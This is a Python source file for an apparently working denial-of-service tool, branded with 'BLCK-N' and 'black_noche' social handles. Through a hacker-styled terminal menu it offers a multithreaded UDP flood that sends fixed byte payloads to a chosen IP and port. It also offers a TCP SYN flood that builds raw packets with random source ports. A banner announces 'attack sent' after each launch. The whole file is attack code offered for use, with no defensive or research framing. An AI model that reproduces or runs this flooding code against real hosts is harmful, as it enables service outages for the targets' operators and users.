import socket
import threading
import datetime
import threading
import time
import os
import struct
import random

_0_v1 = "\033[1;31m"
red = "\033[38;5;196m"
green_hacker = "\033[1;32m"
clear = "\033[0m"

payloads = [
    b"\x08\xb2\x00\x21",
    b"\x08\xb2\x00",
    b"\xD8\x39\x84\x00",
]

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
| github.com/BLCK-N {_0_v1}|{clear} t.me/black_noche {_0_v1}|{clear} Discord {_0_v1}|{clear} discord.gg/blacknoche |
          {_0_v1}
                    ╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦
                    ║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣
                    ╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩ {clear}
           {_0_v1}╔═══════════════════════════════════{clear}
           {_0_v1}║{clear}  {_0_v1}-{clear} tcp      {_0_v1}|{clear} TCP Flood                    
           {_0_v1}║{clear}  {_0_v1}-{clear} udp      {_0_v1}|{clear} UDP Flood           
           {_0_v1}╚═══════════════════════════════════{clear}
                                                                       >>> {green_hacker}Coded by /@{clear} <<<
""")              
    
def layer4():
    while True:
        banner()
        select = input(f"""
╔═══[{_0_v1}root{clear}@{_0_v1}/BLCK-N{clear}]
╚══{_0_v1}>{clear} """)
                                        
        if select.startswith("udp"):
            parts = select.split()
            if len(parts) != 5:
                print(f"usage{_0_v1}:{clear} {_0_v1}udp{clear} <{_0_v1}ip{clear}> <{_0_v1}port{clear}> <{_0_v1}threads{clear}> <{_0_v1}secs{clear}>")
                input()
                continue

            _, ip, port, threads, secs = parts
            port = int(port)
            threads = int(threads)
            secs = int(secs)

            def udp_attack(host, port, secs):
                end_time = time.time() + secs
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while time.time() < end_time:
                    for data in payloads:
                        try:
                            s.sendto(data, (host, port))
                        except:
                            pass
                s.close()


            def th(ip, port, threads, secs):
                for _ in range(threads):
                    t = threading.Thread(target=udp_attack, args=(ip, port, secs))
                    t.start()

            th(ip, port, threads, secs)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
github.com/BLCK-N {_0_v1}|{clear} t.me/black_noche {_0_v1}|{clear} Discord {_0_v1}|{clear} discord.gg/blacknoche
                    {_0_v1}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear} 
     {_0_v1}╔══════════════════════════════════{clear}
     {_0_v1}║{clear} METHODS{_0_v1}:{clear} {_0_v1}[{clear}UDP{_0_v1}]{clear} 
     {_0_v1}║{clear} HOST{_0_v1}:{clear} {_0_v1}[{clear}{ip}{_0_v1}]{clear}                     
     {_0_v1}║{clear} PORT{_0_v1}:{clear} {_0_v1}[{clear}{port}{_0_v1}]{clear}                    
     {_0_v1}║{clear} THREADS{_0_v1}:{clear} {_0_v1}[{clear}{threads}{_0_v1}]{clear}                 
     {_0_v1}║{clear} TIME{_0_v1}:{clear} {_0_v1}[{clear}{secs}{_0_v1}]{clear}                    
     {_0_v1}╚══════════════════════════════════{clear}       
                                                                       >>> {green_hacker}Coded by /@{clear} <<<
""")
            time.sleep(secs)

################################################################################################################################

        elif select.startswith("tcp"):
            parts = select.split()
            if len(parts) != 5:
                print(f"usage{_0_v1}:{clear} {_0_v1}tcp{clear} <{_0_v1}ip{clear}> <{_0_v1}port{clear}> <{_0_v1}threads{clear}> <{_0_v1}secs{clear}>")
                input()
                continue

            _, ip, port, threads, secs = parts
            port = int(port)
            threads = int(threads)
            secs = int(secs)

            def tcp_attack(host, port, secs):
                end_time = time.time() + secs
                flags = 0b00000010
                while time.time() < end_time:
                    try:
                        src_port = random.randint(1024, 65535)
                        pkt = struct.pack('!HHIIBBHHH', src_port, port, 0, 0, 80, flags, 8192, 0, 0)
                        socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP).sendto(pkt, (host, 0))
                    except:
                        pass

            def th(ip, port, threads, secs):
                for _ in range(threads):
                    t = threading.Thread(target=tcp_attack, args=(ip, port, secs))
                    t.start()

            th(ip, port, threads, secs)

            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
github.com/BLCK-N {_0_v1}|{clear} t.me/black_noche {_0_v1}|{clear} Discord {_0_v1}|{clear} discord.gg/blacknoche
                    {_0_v1}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear} 
     {_0_v1}╔══════════════════════════════════{clear}
     {_0_v1}║{clear} METHODS{_0_v1}:{clear} {_0_v1}[{clear}TCP{_0_v1}]{clear}  
     {_0_v1}║{clear} HOST{_0_v1}:{clear} {_0_v1}[{clear}{ip}{_0_v1}]{clear}                       
     {_0_v1}║{clear} PORT{_0_v1}:{clear} {_0_v1}[{clear}{port}{_0_v1}]{clear}                    
     {_0_v1}║{clear} THREADS{_0_v1}:{clear} {_0_v1}[{clear}{threads}{_0_v1}]{clear}                   
     {_0_v1}║{clear} TIME{_0_v1}:{clear} {_0_v1}[{clear}{secs}{_0_v1}]{clear}                   
     {_0_v1}╚══════════════════════════════════{clear}       
                                                                       >>> {green_hacker}Coded by /@{clear} <<<
""")
            time.sleep(secs)

if __name__ == "__main__":
    layer4()









